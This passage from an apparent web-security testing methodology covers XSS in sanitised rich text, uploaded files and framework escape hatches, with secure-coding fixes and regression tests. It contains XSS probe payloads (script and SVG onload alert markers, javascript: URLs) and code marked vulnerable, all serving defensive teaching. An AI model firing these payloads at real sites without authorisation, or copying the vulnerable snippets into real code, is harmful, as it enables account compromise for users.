| Markdown | `html: true` in markdown-it; `marked` without a sanitiser on its output; plugins (diagrams, embeds, math) whose output is not sanitised |

4. **Black-box probes, own objects only.** In a field only your accounts can see, try: raw HTML (`gtx<b>GT-XSS-010</b>`), a link with a `javascript:` URL in the field's link syntax (`[x](javascript:alert(document.domain))` in Markdown), one element with an event handler, and one feature-specific block (a diagram or embed, if the editor offers them). A handful of probes tells you whether the field is encoded, sanitised with a permissive configuration, or not sanitised; it is not a bypass hunt.
5. **Check where sanitisation happens.** Send the same raw HTML through the API directly. If the editor strips it but the API stores it and the page renders it, the sanitiser runs only in the browser and is not a control.
6. **Check what happens after sanitisation.** Features that edit HTML after the sanitiser (mentions, link previews, emoji, syntax highlighting, "read more" truncation that cuts tags) are where bypasses come from.

#### Observation

Illustrative findings: "Bio field: `marked` output assigned to `innerHTML` without sanitisation; `<b>` and an event-handler marker both render for user B." "Comment field: DOMPurify 2.0.12 (before the CVE-2020-26870 fix), default configuration, sanitised client-side only; API accepts raw HTML."

#### Evaluation

- **Fail (XSS):** script marker executes in a sanitised field.
- **Fail (configuration):** a dangerous tag, attribute or scheme allowed by configuration, even if you did not build an executing payload.
- **Fail (version):** a sanitiser version with a published bypass that applies to the configuration in use, or an unmaintained sanitiser (bleach). Rate by reachability; with no working payload, typically Low to Medium.
- **Fail (architecture):** sanitisation only in the browser, or output modified after sanitisation.
- **Pass:** a maintained sanitiser, current version, a conservative configuration, run server-side (or at render time in the browser for DOM sinks), with nothing modifying its output.

#### False positives

Tags that render but cannot execute because the allow-list is limited to formatting (`b`, `i`, `a` with `https:` only): that is the sanitiser working. A sanitiser bypass advisory that depends on an option the application does not use.

#### Automation

Dependency scanning (`npm audit`, `pip-audit`, Dependabot) for versions; a unit test per field that feeds a few hostile fragments into the real sanitiser configuration and asserts the output (see [Sanitising rich text](#sanitising-rich-text)).

### GT-WEB-XSS-11: Uploaded files, Content-Type and nosniff

*Guler Tech methodology.* Implements the file-upload part of WSTG-INJT-02 (stored XSS through uploaded files and MIME handling) and checks ASVS `v5.0.0-3.2.1`, `v5.0.0-3.4.4` and `v5.0.0-1.3.4`.

#### What it checks

Whether files you upload, or responses that carry your data, are rendered by the browser as active documents on the application's origin.

#### Prerequisites

An upload feature in scope (avatars, attachments, imports); your own test files; the URLs at which uploads are served.

#### Steps

1. Prepare small test files, each containing only a marker:

```html
<!-- gt-xss-011.html -->
<p>GT-XSS-011</p><script>alert(document.domain)</script>
```

```html
<!-- gt-xss-011.svg -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><text y="20">GT-XSS-011</text></svg>
```

2. Upload each one to your own account, plus two variants of the SVG: renamed to `.png`, and uploaded with `Content-Type: image/png` in the multipart part.
3. Fetch each file's URL and read the headers:

```bash
curl -sI -b 'session=<SESSION_USER_A>' "https://app.example.com/uploads/7f3c/gt-xss-011.svg"
```

```http
HTTP/1.1 200 OK
Content-Type: image/svg+xml
Content-Disposition: inline; filename="gt-xss-011.svg"
```

4. Open the URL directly in the browser as user B (if the file is shared) or as user A. A dialog naming `app.example.com` means the file runs on the application origin.
5. Check the defences on the file route: `X-Content-Type-Options: nosniff`, `Content-Disposition: attachment` for types that should not render, a CSP `sandbox` directive on file responses, and whether files are served from a separate registrable domain.
6. Check API responses that carry user data: an endpoint that returns JSON or text with `Content-Type: text/html`, or no type at all, renders your stored HTML when its URL is opened directly.

```http
GET /api/export?id=31 HTTP/1.1
Host: app.example.com
Cookie: session=<SESSION_USER_A>

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

{"name":"gtx<b>GT-XSS-011</b>"}
```

#### Observation

Correct handling looks like this: SVG either re-encoded to a raster image or sanitised, or served with `Content-Disposition: attachment`; the type is set by the server from validated content, not echoed from the upload; `nosniff` is present; and user content lives on a separate registrable domain (in our examples, `example.org`). On that separate domain, the dialog (if any) shows the other domain.

#### Evaluation

- **Fail (stored XSS):** an uploaded file executes the marker on the application origin when opened. Users must be lured to the file URL, which matters for the rating; it is still stored XSS.
- **Fail (lower):** it executes only on a separate sandbox domain (content spoofing; check the sandbox domain has no cookies or credentials of value).
- **Fail (configuration):** user data served as `text/html` from an API, or `nosniff` missing on responses carrying user content (ASVS L2).
- **Pass:** no uploaded content renders as an active document on the application origin.

#### False positives

An SVG that runs when you open it but is only ever embedded through `img` in the application: it still runs when a victim opens the link, so this is a finding, but rate the delivery as needing a lure. A file that renders only for you because it is private to your account: self-only unless it can be shared.

#### Automation

A CI test that uploads the two marker files and asserts the download response headers (type, disposition, `nosniff`). Deeper upload testing (extensions, magic bytes, storage location, server-side execution) is part of the Server-Side Request & Files subcategory, not yet published.

### GT-WEB-XSS-12: Framework escape-hatch and template review

*Guler Tech methodology.* Implements the grey-box and source-review guidance of WSTG-INJT-01 and WSTG-INJT-02 (analyse every variable that reaches output and every sanitisation routine).

#### What it checks

Where the code base switches off its framework's escaping, configures it off, or writes data into contexts the framework does not protect.

#### Prerequisites

Source code or a repository read-only clone, and the frameworks and template engines in use.

#### Steps

1. Grep for raw-output features and configuration (adapt paths; these are starting points, not exhaustive):

{% raw %}
```bash
# React, Vue, Angular, DOM
grep -rnE 'dangerouslySetInnerHTML|v-html|bypassSecurityTrust(Html|Script|Style|Url|ResourceUrl)|innerHTML\s*=|outerHTML|insertAdjacentHTML|document\.write' src/

# Django and Jinja2
grep -rnE 'mark_safe\(|\|\s*safe\b|\{%\s*autoescape\s+(off|false)|autoescape\s*=\s*False|Markup\(|SafeString' .
grep -rnE 'Environment\(' --include='*.py' .   # then check each call for autoescape=

# Thymeleaf, Blade, Rails, Express engines
grep -rnE 'th:utext|\[\(\$\{' src/main/resources/templates/
grep -rn '{!!' resources/views/
grep -rnE '\.html_safe|raw\(|<%==' app/views/ app/helpers/
grep -rnE '<%-|!\{|!=|\{\{\{' views/
```
{% endraw %}

2. For each hit, trace the value back: a constant or a sanitiser's output is acceptable; anything from a request, the database or another service is a candidate finding. Confirm it dynamically with the test for that context.
3. Look for data written into contexts no engine protects: inline `<script>` blocks with template variables, `on*` attributes, `style` attributes, `href`/`src` attributes bound to user data without a scheme check, and responses built by string concatenation (`res.send`, `HttpServletResponse.getWriter`, `echo`).
4. Check configuration: Jinja2 environments without `autoescape` (outside Flask's defaults), Handlebars `noEscape: true`, EJS with a replaced `escape` function, custom Django filters marked `is_safe=True`.
5. Check versions: React (for the `javascript:` URL behaviour), Angular and AngularJS (AngularJS client-side template injection is in the DOM note), sanitiser libraries (test 10).
6. Run the client's SAST if they have one, or CodeQL's XSS queries (`js/reflected-xss`, `js/stored-xss`, `py/reflective-xss`, `java/xss`) and Semgrep rules for the frameworks in use, and triage the results with the same trace-back question.

#### Observation

A list of call sites with a verdict each (illustrative):

| File | Construct | Source of value | Verdict |
|---|---|---|---|
| `src/components/Bio.tsx` | `dangerouslySetInnerHTML` | `marked(user.bio)` | **Finding**: no sanitiser |
| `templates/emails/preview.html` | `safe` filter | `campaign.body` (tenant-authored) | **Finding**: stored XSS for other tenant users |
| `resources/views/help.blade.php` | unescaped echo | `__('help.intro')` (translation file) | Acceptable; note as fragile |
| `app/views/orders/show.html.erb` | `raw` | `sanitize(order.notes)` | Acceptable; check the sanitiser's allow-list |

#### Evaluation

- **Fail:** a raw-output construct or unprotected context fed by user-influenced data. Confirm dynamically where possible; report confirmed ones as XSS and unconfirmed ones as code-review findings.
- **Pass:** raw output only for constants or sanitiser output, and no data in dangerous contexts.

#### False positives

Raw output of a value that is HTML-escaped earlier by hand (acceptable only if the context is plain HTML text; double-check it). Translation strings and CMS content authored only by trusted staff: not XSS unless lower-privileged users can edit them, but worth a note.

#### Automation

Semgrep or CodeQL in CI with a rule per escape hatch; lint rules such as `react/no-danger` (eslint-plugin-react) and `vue/no-v-html` (eslint-plugin-vue), so that every use needs a reviewed exception.

## Secure implementation

### Design rules

1. **Escape on output, by the template engine, for the context.** Keep auto-escaping on everywhere and let the engine do it at the last moment (ASVS `v5.0.0-1.1.2`, L2: encode as the final step before the interpreter). Do not store pre-escaped HTML; it double-encodes in one place and is missing in the next.
2. **Keep data out of dangerous contexts.** No user data in inline scripts, event handlers, `style` blocks, comments, tag or attribute names. Pass data to JavaScript in a JSON data block or `data-` attributes and read it with `JSON.parse(el.textContent)` or `el.dataset`. On the client, display text with `textContent` and `createTextNode`, as `v5.0.0-3.2.2` (L1) requires.
3. **Always quote attributes,** and choose attribute names in code, never from data.
4. **Validate URL schemes on the server** with a parser and an allow-list (`v5.0.0-1.2.2`), then let the template encode the URL.
5. **Treat every escape hatch as a security review item.** Each `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrust…`, `mark_safe`, `safe`, `th:utext`, unescaped Blade echo, `raw` or `html_safe` takes either a constant or the output of a sanitiser, with a comment saying which.
6. **Rich text goes through a maintained sanitiser** with a minimal allow-list (`v5.0.0-1.3.1`), kept up to date, run where it cannot be skipped (server side, or at render time right before the DOM sink), and nothing modifies its output afterwards. Markdown is rendered with raw HTML disabled and the result sanitised anyway (`v5.0.0-1.3.5`).
7. **Serve every response with the right `Content-Type` and `nosniff`.** Serve user files with `Content-Disposition: attachment` or from a separate domain; sanitise or rasterise SVG (`v5.0.0-3.2.1`, `v5.0.0-3.4.4`, `v5.0.0-1.3.4`).
8. **Add CSP and Trusted Types as a second layer, not the first.**

### Node.js and Express templates

Express does not escape anything itself; the template engine does. Use the escaping form of your engine and never build HTML with string concatenation in a route.

```html
<!-- EJS: <%= %> escapes, <%- %> does not -->
<h1>Results for <%= q %></h1>
<input name="q" value="<%= q %>">
```

Pug escapes with `#{}` and `=` and does not with `!{}` and `!=`. Handlebars escapes values in double braces and outputs triple-brace values raw. Its `noEscape` compile option switches escaping off for the whole template and should never be set for HTML.

```javascript
// Vulnerable: HTML by concatenation bypasses every template protection
app.get("/search", (req, res) => {
  res.send(`<h1>Results for ${req.query.q}</h1>`);
});

// Fixed: render through the engine (auto-escaped), or escape explicitly for a tiny fragment
const escapeHtml = require("escape-html");
app.get("/search", (req, res) => {
  res.render("search", { q: String(req.query.q ?? "") });
});
app.get("/ping", (req, res) => {
  res.type("html").send(`<p>Hello ${escapeHtml(String(req.query.name ?? ""))}</p>`);
});
```

Passing state to client code: `JSON.stringify` is not safe inside `<script>`. Escape the characters that can end the block or the line, or use a JSON data block:

```javascript
// Safe JSON for embedding in HTML: no "<", ">", "&" or line separators survive
function jsonForHtml(value) {
  return JSON.stringify(value)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/ /g, "\\u2028")
    .replace(/ /g, "\\u2029");
}

// In the EJS template (raw output is fine here because the string is already safe):
//   <script id="state" type="application/json"><%- jsonForHtml(state) %></script>
// In client code:
//   const state = JSON.parse(document.getElementById("state").textContent);
```

The npm package `serialize-javascript` does the same job if you prefer a library. For APIs, `res.json()` sets `Content-Type: application/json`, and `helmet` sets `X-Content-Type-Options: nosniff` by default:

```javascript
const helmet = require("helmet");
app.use(helmet()); // includes nosniff; configure its CSP separately (see the CSP note)
```

### React

JSX escapes text and attribute values. The risks are `dangerouslySetInnerHTML`, URLs, and code that leaves React to touch the DOM directly.

{% raw %}
```typescript
import DOMPurify from "dompurify";

// Vulnerable: Markdown or rich text rendered raw
function Bio({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// Fixed: sanitise immediately before the sink, with a minimal profile
function SafeBio({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```
{% endraw %}

```typescript
// URL attributes: allow-list schemes instead of relying on React's javascript: handling
const ALLOWED = new Set(["https:", "mailto:"]);
export function safeHref(value: string): string | undefined {
  try {
    const url = new URL(value, "https://app.example.com");
    return ALLOWED.has(url.protocol) ? url.href : undefined;
  } catch {
    return undefined;
  }
}
// <a href={safeHref(user.website)} rel="noopener noreferrer">Website</a>
```

React 19 replaces `javascript:` URLs with one that throws, and React 16.9 to 18 only log a warning. Neither covers `data:` URLs, other attributes you set through refs, or HTML you build yourself. The server-side check (see [URL scheme allow-lists](#url-scheme-allow-lists)) protects every client, including old ones.

### Angular and Vue

Angular sanitises values bound to `[innerHTML]`, `[href]`, `[src]` and `[style]` unless they were marked trusted. Do not call `bypassSecurityTrustHtml` (or the Script, Style, Url and ResourceUrl variants) on anything derived from user data; if a value must be trusted, sanitise it first and keep the call next to the sanitiser:

```typescript
import { Component, Input, inject } from "@angular/core";
import { DomSanitizer, SafeHtml } from "@angular/platform-browser";

@Component({ selector: "app-bio", template: `<div [innerHTML]="bio"></div>` })
export class BioComponent {
  // Fine: Angular sanitises a plain string bound to [innerHTML]
  @Input() bio = "";
}

@Component({ selector: "app-bio-unsafe", template: `<div [innerHTML]="bio"></div>` })
export class UnsafeBioComponent {
  private sanitizer = inject(DomSanitizer);
  bio: SafeHtml = "";
  // Vulnerable: marking user data as trusted switches Angular's sanitiser off
  @Input() set html(value: string) {
    this.bio = this.sanitizer.bypassSecurityTrustHtml(value);
  }
}
```

Vue does not sanitise `v-html` at all, and its security guide says user-provided HTML is never fully safe unless sandboxed. Use text interpolation; where HTML is required, sanitise it in a computed property and bind that:

```typescript
import DOMPurify from "dompurify";
import { computed } from "vue";

const props = defineProps<{ bio: string }>();
const safeBio = computed(() => DOMPurify.sanitize(props.bio, { USE_PROFILES: { html: true } }));
// Template: <div v-html="safeBio"></div>
```

Vue binds `href` values as given, so validate URLs on the server (Vue's guide makes the same recommendation).

### Django

Templates auto-escape every variable. Keep it that way: no `autoescape off` blocks around user data, no `safe` filter or `mark_safe()` on it, quotes around every attribute, and `format_html()` instead of string formatting when building fragments in Python.

```python
from django.utils.html import format_html, format_html_join

# Vulnerable: mark_safe on interpolated user data
# return mark_safe(f'<a href="/u/{user.pk}">{user.display_name}</a>')

# Fixed: format_html escapes every argument
def user_link(user):
    return format_html('<a href="/u/{}">{}</a>', user.pk, user.display_name)
```

Data for JavaScript goes through `json_script`, which escapes `<`, `>` and `&` and produces a JSON block that works with a strict CSP:

{% raw %}
```html
<!-- template -->
<p title="{{ user.display_name }}">{{ user.display_name }}</p>
{{ profile_data|json_script:"profile-data" }}
<script nonce="{{ csp_nonce }}">
  const profile = JSON.parse(document.getElementById("profile-data").textContent);
</script>
```
{% endraw %}

(The `csp_nonce` variable comes from Django's built-in CSP support, added in Django 6.0, when the `csp()` context processor is enabled; see the CSP note.) For rich text, sanitise with nh3, which replaces the deprecated bleach:

```python
import nh3

ALLOWED_TAGS = {"p", "br", "b", "i", "em", "strong", "ul", "ol", "li", "a", "code", "pre", "blockquote"}
ALLOWED_ATTRIBUTES = {"a": {"href", "title"} }

def clean_rich_text(html: str) -> str:
    return nh3.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        url_schemes={"https", "mailto"},
        link_rel="noopener noreferrer",
    )
```

Django's `SecurityMiddleware` sends `X-Content-Type-Options: nosniff` because `SECURE_CONTENT_TYPE_NOSNIFF` defaults to `True`; check that nobody turned it off.

### Jinja2 and Flask

Flask enables auto-escaping for `.html`, `.htm`, `.xml`, `.xhtml` and `.svg` templates. A bare `jinja2.Environment()` does not escape at all, and Jinja's own documentation recommends configuring it explicitly:

```python
from jinja2 import Environment, PackageLoader, select_autoescape

# Vulnerable: no autoescape argument means no escaping
# env = Environment(loader=PackageLoader("reports"))

# Fixed
env = Environment(
    loader=PackageLoader("reports"),
    autoescape=select_autoescape(["html", "htm", "xml", "svg"]),
)
```

The `tojson` filter produces JSON that is safe inside HTML and `<script>` elements; Jinja's documentation notes the exception of double-quoted attributes, where you need single quotes or `forceescape`:

{% raw %}
```html
<script id="cfg" type="application/json">{{ config_data|tojson }}</script>
<div data-user='{{ user|tojson }}'>{{ user.name }}</div>
{# Never: {{ user.bio|safe }} unless bio is the output of nh3.clean() #}
```
{% endraw %}

### Spring and Thymeleaf

`th:text` escapes; `th:utext` does not. In inline scripts, use JavaScript inlining with the escaped double-bracket form, which quotes and JavaScript-escapes the value:

```html
<p th:text="${user.displayName}">Name</p>
<input type="text" th:value="${user.displayName}">
<!-- Never for user data: <div th:utext="${user.bio}"></div> -->

<script th:inline="javascript">
  const displayName = [[${user.displayName}]];
  // Never: [(${user.displayName})]  (unescaped)
</script>
```

For JSP or hand-built output, use the OWASP Java Encoder with the method for the context (`Encode.forHtml`, `Encode.forHtmlAttribute`, `Encode.forJavaScript`, `Encode.forUriComponent`). For rich text, the OWASP Java HTML Sanitizer:

```java
import org.owasp.html.HtmlPolicyBuilder;
import org.owasp.html.PolicyFactory;
import org.owasp.html.Sanitizers;

public final class RichText {
  private static final PolicyFactory POLICY = Sanitizers.FORMATTING
      .and(Sanitizers.BLOCKS)
      .and(new HtmlPolicyBuilder()
          .allowElements("a")
          .allowUrlProtocols("https", "mailto")
          .allowAttributes("href").onElements("a")
          .requireRelNofollowOnLinks()
          .toFactory());

  public static String clean(String untrusted) {
    return POLICY.sanitize(untrusted);
  }
}
```

Spring Security adds `X-Content-Type-Options: nosniff` to responses by default; keep it, and set `Content-Disposition` explicitly on file downloads.

### Laravel Blade

Blade's double-curly-brace echo passes the value through `htmlspecialchars`. The unescaped echo (one brace and two exclamation marks on each side) does not, and Laravel's documentation tells you to be very careful with it for user-supplied content. For data in scripts, use `Js::from`, which escapes JSON for inclusion in HTML:

{% raw %}
```php
{{-- resources/views/profile.blade.php --}}
<h1>{{ $user->display_name }}</h1>
<a href="{{ $safeWebsite }}" rel="noopener noreferrer">Website</a>

<script>
  const profile = {{ Js::from($profileData) }};
</script>

{{-- Never for user data: {!! $user->bio !!} --}}
{{-- Rich text: only after HTMLPurifier --}}
<div class="bio">{!! $cleanBio !!}</div>
```
{% endraw %}

```php
// Sanitise rich text with HTMLPurifier (ezyang/htmlpurifier) before storing or rendering
$config = HTMLPurifier_Config::createDefault();
$config->set('HTML.Allowed', 'p,br,b,i,em,strong,ul,ol,li,a[href|title],code,pre,blockquote');
$config->set('URI.AllowedSchemes', ['https' => true, 'mailto' => true]);
$purifier = new HTMLPurifier($config);
$cleanBio = $purifier->purify($user->bio);
```

Laravel packages such as `mews/purifier` wrap HTMLPurifier with a config file; the settings are the same.

### Rails

ERB escapes `<%= %>` output. `raw`, `html_safe` and `<%==` switch it off. The Rails guides stress that `html_safe` performs no escaping; it only asserts the string is safe. Use `sanitize` for rich text with an explicit allow-list; it strips unsafe tags and attributes and removes `href` and `src` values with unsafe protocols such as `javascript:`:

```text
# app/helpers/profile_helper.rb
def bio_html(bio)
  sanitize(bio, tags: %w[p br b i em strong ul ol li a code pre blockquote],
                attributes: %w[href title])
end
# View: <%= bio_html(@user.bio) %>   Never: <%= raw @user.bio %> or @user.bio.html_safe
```

### Sanitising rich text

Choose a maintained sanitiser for the language where the HTML is rendered, configure the smallest allow-list that supports the product, and re-check the version as part of dependency updates:

| Language | Sanitiser | Notes |
|---|---|---|
| Browser / Node.js | DOMPurify | OWASP's recommendation in the XSS Prevention Cheat Sheet. On the server it needs a DOM: DOMPurify recommends a current `jsdom`, because old `jsdom` versions have bugs that cause XSS even when DOMPurify works correctly |
| Node.js | sanitize-html | Defaults allow common formatting and `http`, `https`, `ftp`, `mailto`, `tel` links; never allow `script` or `style` |
| Python | nh3 (ammonia) | Replacement for bleach; `clean()` with explicit `tags`, `attributes`, `url_schemes` |
| Java | OWASP Java HTML Sanitizer | Policies built with `HtmlPolicyBuilder` or prepackaged `Sanitizers` |
| PHP | HTMLPurifier | Standards-aware and strict; configure `HTML.Allowed` and `URI.AllowedSchemes` |
| Ruby | Rails `sanitize` (rails-html-sanitizer) | Pass `tags:` and `attributes:` explicitly |

A DOMPurify configuration for a comment field:

```javascript
import DOMPurify from "dompurify";

const COMMENT_POLICY = {
  ALLOWED_TAGS: ["p", "br", "b", "i", "em", "strong", "ul", "ol", "li", "a", "code", "pre", "blockquote"],
  ALLOWED_ATTR: ["href", "title"],
  ALLOW_DATA_ATTR: false,
};

export function cleanComment(html) {
  // Sanitise last: nothing may modify the result before it reaches the DOM
  return DOMPurify.sanitize(html, COMMENT_POLICY);
}
```

DOMPurify's default URI handling already rejects `javascript:`; leave `ALLOWED_URI_REGEXP` alone unless you narrow it further. For Markdown, render with HTML disabled and sanitise the result anyway, so that plugins cannot reintroduce markup:

```javascript
import MarkdownIt from "markdown-it";
import DOMPurify from "dompurify";

const md = new MarkdownIt({ html: false, linkify: true }); // html: false is the default; state it
export const renderMarkdown = (src) => DOMPurify.sanitize(md.render(src));
```

Where to sanitise: on output (or at least on output as well as on input) lets you tighten the policy later and protects against data that entered through another channel. If you sanitise only on input, re-sanitise stored content when the policy or library changes.

### URL scheme allow-lists

Parse, then compare the parsed scheme with an allow-list. Regular expressions on the raw string miss the whitespace, control characters and case variations that URL parsers accept.

```python
from urllib.parse import urlsplit

ALLOWED_SCHEMES = {"https", "mailto"}

def validate_user_url(value: str) -> str:
    value = value.strip()
    parts = urlsplit(value)
    if parts.scheme.lower() not in ALLOWED_SCHEMES:
        raise ValueError("Only https and mailto links are allowed")
    if parts.scheme.lower() == "https" and not parts.netloc:
        raise ValueError("Absolute https URL required")
    return value
```

```java
import java.net.URI;
import java.util.Locale;
import java.util.Set;

public final class UserUrls {
  private static final Set<String> ALLOWED = Set.of("https", "mailto");

  public static String validate(String value) {
    URI uri = URI.create(value.strip());
    String scheme = uri.getScheme() == null ? "" : uri.getScheme().toLowerCase(Locale.ROOT);
    if (!ALLOWED.contains(scheme)) {
      throw new IllegalArgumentException("Only https and mailto links are allowed");
    }
    return uri.toString();
  }
}
```

`URI.create` rejects values with spaces and control characters, which is what you want here. Validate on write (reject the value with a clear error), and keep the check in the rendering path for data that arrived before the rule existed.

### Content-Type, nosniff and downloads

- Every response gets an explicit `Content-Type` with a charset; JSON APIs use `application/json`, never `text/html`.
- `X-Content-Type-Options: nosniff` on all responses (Django, Spring Security and helmet do this by default; check reverse proxies and file servers too).
- User uploads: decide the type on the server from validated content, not from the upload request; serve with `Content-Disposition: attachment` unless the type is on a short inline list (raster images, PDF if needed); put a filename in the header, encoded per RFC 6266 (ASVS `v5.0.0-5.4.1`, `v5.0.0-5.4.2`).
- Prefer a separate registrable domain for user content (in our examples `example.org`), with no cookies or credentials of the main application, and a `Content-Security-Policy: sandbox` header on file responses.
- SVG: convert to PNG on upload, or sanitise with DOMPurify's SVG profile and still serve it as an attachment or from the separate domain.

```javascript
// Express: serving a stored upload
app.get("/files/:id", requireAuth, async (req, res) => {
  const file = await files.findForUser(req.params.id, req.user.id); // authorisation first
  res.attachment(file.downloadName);                // Content-Disposition: attachment; filename=... (also guesses a type)
  res.set({
    "Content-Type": file.safeMimeType,            // then override with the type from server-side detection
    "X-Content-Type-Options": "nosniff",
    "Content-Security-Policy": "sandbox; default-src 'none'",
  });
  file.stream().pipe(res);
});
```

### CSP and Trusted Types as defence in depth

A strict, nonce-based Content Security Policy stops most injected script from running even when encoding fails somewhere, and ASVS `v5.0.0-3.4.3` (L2) asks for one with at least `object-src 'none'` and `base-uri 'none'`. It is a second layer: the OWASP cheat sheet warns against relying on CSP alone, and the GitLab cases in [Real-world cases](#real-world-cases) both include a CSP bypass. Policy design, nonces, `strict-dynamic` and common weaknesses are in [CSP and security headers](/web/web-content-security-policy-headers/).

Trusted Types (`require-trusted-types-for 'script'`) make the DOM's HTML sinks reject plain strings, so `innerHTML = userString` throws unless the value came through a policy you wrote (for example, one that calls DOMPurify). MDN lists it as Baseline 2026 (newly available since February 2026). It addresses the client-side half of the problem; see [DOM XSS and client-side injection](/web/web-dom-xss-client-side-injection/).

### Regression tests

Assert that markers come back **encoded**, per field and per template, and that no dialog fires in a real browser. A hostile fixture used across the suite:

```python
# Django: tests/test_xss.py
from django.test import TestCase
from django.urls import reverse

MARKER = 'gtx"\'<b>GT-XSS</b></script>'

class ProfileXssTests(TestCase):
    def setUp(self):
        self.user = make_user(display_name=MARKER, website="javascript:alert(1)")  # project fixture helper
        self.client.force_login(self.user)

    def test_display_name_encoded(self):
        html = self.client.get(reverse("profile", args=[self.user.pk])).content.decode()
        self.assertNotIn("<b>GT-XSS</b>", html)
        self.assertIn("&lt;b&gt;GT-XSS&lt;/b&gt;", html)
        self.assertEqual(html.count("</script>"), html.count("<script"))  # no early close

    def test_javascript_url_rejected(self):
        resp = self.client.post(reverse("profile-edit"), {"website": "javascript:alert(1)"})
        self.assertEqual(resp.status_code, 400)
```

```javascript
// Express + Jest + supertest
const request = require("supertest");
const app = require("../app");

test("search term is encoded in every context", async () => {
  const res = await request(app).get("/search").query({ q: 'gtx"\'<b>GT-XSS</b></script>' });
  expect(res.text).not.toContain("<b>GT-XSS</b>");
  expect(res.text).toContain("&lt;b&gt;GT-XSS&lt;/b&gt;");
  expect(res.headers["x-content-type-options"]).toBe("nosniff");
});
```

```java
// Spring MockMvc
@Test
void displayNameIsEncoded() throws Exception {
  userRepository.save(testUser("gtx\"'<b>GT-XSS</b>"));
  mockMvc.perform(get("/profile/1").with(user("user-a")))
      .andExpect(content().string(not(containsString("<b>GT-XSS</b>"))))
      .andExpect(content().string(containsString("&lt;b&gt;GT-XSS&lt;/b&gt;")));
}
```

```php
// Laravel feature test
public function test_display_name_is_encoded(): void
{
    $user = User::factory()->create(['display_name' => 'gtx"\'<b>GT-XSS</b>']);
    $this->actingAs($user)->get("/profile/{$user->id}")
        ->assertDontSee('<b>GT-XSS</b>', false)
        ->assertSee('&lt;b&gt;GT-XSS&lt;/b&gt;', false);
}
```

A browser-level check catches what string assertions miss (sanitiser output re-parsed, client-side rendering of stored data):

```typescript
// Playwright: fail if any dialog opens while rendering hostile fixtures
import { test, expect } from "@playwright/test";

test("no script runs from stored profile data", async ({ page }) => {
  let dialogs = 0;
  page.on("dialog", async (d) => { dialogs++; await d.dismiss(); });
  await page.goto("https://app.example.com/profile/fixture-hostile"); // staging copy of the app
  await page.waitForLoadState("networkidle");
  expect(dialogs).toBe(0);
});
```

Keep the fixture's fields full of markers (`<b>`, an `onerror` image, `</script>`, a `javascript:` URL, a Markdown link with `javascript:`) and render every template that shows them, including emails, exports and admin screens.

## Practice labs

Labs are where you can build full exploits (session riding, CSRF-token theft, account takeover chains) to understand impact. Keep this note's habits anyway: find the context first, read the raw response, and prove execution with a marker before anything else.

**PortSwigger Web Security Academy** (free; see [all XSS labs](https://portswigger.net/web-security/all-labs#cross-site-scripting)):

- [Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded) and [Stored XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded): tests 3 and 8 at their simplest.
- [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded): test 4, breaking out of a quoted attribute with a new event handler.
- [Stored XSS into anchor href attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded): test 5, the `javascript:` URL that survives encoding.
- [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag): test 4, attributes on elements that do not fire events by themselves.
- [Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded), [with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped), and [with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped): test 6, string breakout, `</script>` and the unescaped backslash.
- [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped): test 6, `${…}`.
- [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped): the nested-context and entity-decoding point from [How it works](#nested-contexts-and-decoding-order).
- [Reflected XSS in a JavaScript URL with some characters blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked): test 5 with a partial filter.
- [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked), [with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked) and [with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed): what an incomplete deny-list looks like (test 3 step 3 and test 10), practised with the cheat sheet in a lab rather than on a client.
- [Reflected XSS protected by CSP, with CSP bypass](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-csp-bypass): why CSP is a second layer.

**OWASP Juice Shop** ([companion guide, XSS](https://pwning.owasp-juice.shop/companion-guide/latest/part2/xss.html)): *Reflected XSS*; *API-only XSS* (stored XSS by calling the API directly, test 8 step 5); *Client-side XSS Protection* (a check that exists only in the front end); *Server-side XSS Protection* (bypassing a server-side sanitiser, test 10); *HTTP-Header XSS* (a stored header shown later); *CSP Bypass*; and *Video XSS* (a payload in subtitles). *DOM XSS* and *Bonus Payload* belong with the DOM note.

## Real-world cases

